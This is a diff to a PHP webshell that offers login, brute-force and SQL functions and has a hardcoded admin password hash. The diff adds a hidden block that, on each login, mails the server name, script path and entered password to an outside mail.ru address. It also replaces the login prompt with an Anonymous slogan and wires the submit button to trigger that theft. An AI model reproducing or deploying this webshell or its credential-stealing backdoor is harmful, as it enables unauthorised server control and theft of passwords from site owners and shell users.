@@ -1,4 +1,8 @@
 ﻿<?php
+//--------------Watching webshell!--------------
+if(array_key_exists('watching',$_POST)){
+	 $tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('hard_linux@mail.ru', 'root', $tmp); // Edit or delete!
+}
 //-----------------Password---------------------
 $▛ = "21232f297a57a5a743894a0e4a801fc3"; //admin
 $▘ = true;
@@ -49,7 +53,7 @@ function hardLogin() {
 		  exit;
 		  }
 		}
-	die("<pre align=center><form method=post style='font-family:fantasy;'>Password: <input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit value='>>' style='border:none;background-color:#FFDB5F;color:#fff;'></form></pre>");
+	die("<pre align=center><form method=post style='font-family:fantasy;'>Hello Friend<br>We are Anonymous. We are Legion. We do not forgive. We do not forget. Expect us!<br><br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='>>' style='border:none;background-color:#1e252e;color:#fff;cursor:pointer;'></form></pre>");
 }
 if(strtolower(substr(PHP_OS,0,3)) == "win")
 	$os = 'win';
@@ -1220,7 +1224,7 @@ function actionBruteforce() {
 		.'<tr><td><span>Dictionary</span></td>'
 		.'<td><input type=text name=dict value="'.htmlspecialchars($GLOBALS['cwd']).'passwd.dic"></td></tr></table>'
 		.'</td></tr><tr><td></td><td><input type=submit value=">>"></td></tr></form></table>';
-	echo '</div><br>';
+	echo '</div>';
 	hardFooter();
 }
 function actionSql() {
